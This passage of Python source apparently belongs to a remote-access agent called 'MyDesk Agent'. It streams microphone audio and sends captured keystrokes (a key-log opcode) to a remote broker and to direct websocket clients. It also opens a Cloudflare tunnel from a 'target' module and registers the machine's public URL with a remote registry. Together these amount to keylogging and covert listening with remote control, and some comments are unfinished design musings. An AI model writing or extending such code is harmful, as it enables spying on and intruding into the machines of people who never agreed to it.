                    # If it's a fatal error, try to restart the stream
                    if failures > 5:
                        if restart_attempts >= MAX_RESTARTS:
                             print("[-] Mic Max Restarts Exceeded.")
                             break
                        
                        # Increment once per attempt scope
                        restart_attempts += 1
                        print(f"[*] Restarting Mic (Attempt {restart_attempts}/{MAX_RESTARTS})...")
                        self.mic.stop()
                        
                        # Backoff
                        await asyncio.sleep(min(30, 2 ** restart_attempts))
                        
                        if self.mic.start():
                            failures = 0 
                            print("[+] Mic Restored")
                            continue
                        else:
                            print("[-] Mic Restart Failed.")
                            # Increment failures to respect restart counter
                            failures += 1
                            await asyncio.sleep(5)
                    
                    await asyncio.sleep(0.1)
                
        except (websockets.exceptions.ConnectionClosed, ConnectionError):
            print("[-] Mic Stream: Connection Closed")
        except Exception as e:
            print(f"[-] Mic Stream Fatal Error: {e}")
        finally:
            self.mic_streaming = False

    def send_key_sync(self, key_str):
        if self.streaming and self.ws and self.loop:
            asyncio.run_coroutine_threadsafe(self.send_key_async(key_str), self.loop)

    async def send_key_async(self, key_str):
        try:
            msg = bytes([protocol.OP_KEY_LOG]) + key_str.encode('utf-8')
            # Broadcast to Broker
            if self.ws:
                await send_msg(self.ws, msg)
            # Broadcast to All Direct Clients
            for client in list(self.direct_ws_clients):
                await send_msg(client, msg)
        except Exception:
            pass

    def start(self, local_mode=False):
        # 1. Start Cloudflare Tunnel (Hybrid Mode)
        if not local_mode:
            try:
                from target.tunnel_manager import TunnelManager
                from target import config
                import requests
                
                print("[*] Starting Cloudflare Tunnel...")
                self.tunnel_mgr = TunnelManager(port=8765) # Using a fake port for now, or internal server
                # Note: For real functionality, we need a local internal server. 
                # For now, we will just establish the tunnel to prove connectivity logic.
                # But wait, cloudflared needs an HTTP server to forward TO.
                # The Broker is WebSocket. We need a local WS server for the Direct Link.
                # Let's start the internal WS server first? 
                # Actually, let's just implement the signaling for now.
                
                pub_url = self.tunnel_mgr.start()
                if pub_url:
                    print(f"[+] Tunnel Established: {pub_url}")
                    # 2. Report to Registry
                    # Validate registry URL scheme
                    from urllib.parse import urlparse
                    if urlparse(config.REGISTRY_URL).scheme != 'https':
                         print("[-] Registry Error: URL must be HTTPS")
                         return

                    # Use Auth header, not payload
                    import hashlib
                    # Pseudonymize ID for logs/privacy
                    safe_id = hashlib.sha256(self.my_id.encode()).hexdigest()[:8]
                    
                    payload = {
                        "id": self.my_id,
                        "username": config.AGENT_USERNAME,
                        "url": pub_url
                    }
                    headers = {
                        "Authorization": f"Bearer {config.REGISTRY_PASSWORD}",
                        "Content-Type": "application/json"
                    }
                    
                    try:
                        r = requests.post(
                            f"{config.REGISTRY_URL}/update", 
                            json=payload, 
                            headers=headers,
                            timeout=10
                        )
                        if r.status_code == 200:
                            print(f"[+] Registered with Registry (ID hash: {safe_id})")
                        else:
                            print(f"[-] Registry Update Failed: {r.status_code}")
                    except Exception as e:
                        print(f"[-] Registry Connect Error: {e}")
                else:
                     print("[-] Tunnel Failed to Start")
                     
            except Exception as e:
                print(f"[-] Hybrid Setup Error: {e}")
        else:
            print("[*] Local Mode: Skipping Cloudflare Tunnel")

        # Start the asyncio loop
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        
        # Run both the Direct Server (port 8765) and the Broker Connection concurrently
        try:
            self.loop.run_until_complete(asyncio.gather(
                self.start_direct_server(),
                self.connect_loop()
            ))
        except KeyboardInterrupt:
            pass
        finally:
            self.loop.close()

def main():
    parser = argparse.ArgumentParser(description="MyDesk Agent")
    parser.add_argument("--local", action="store_true", help="Run in local mode (skip Cloudflare Tunnel)")
    args = parser.parse_args()

    agent = AsyncAgent(DEFAULT_BROKER)
    agent.start(local_mode=args.local)

if __name__ == "__main__":
    main()
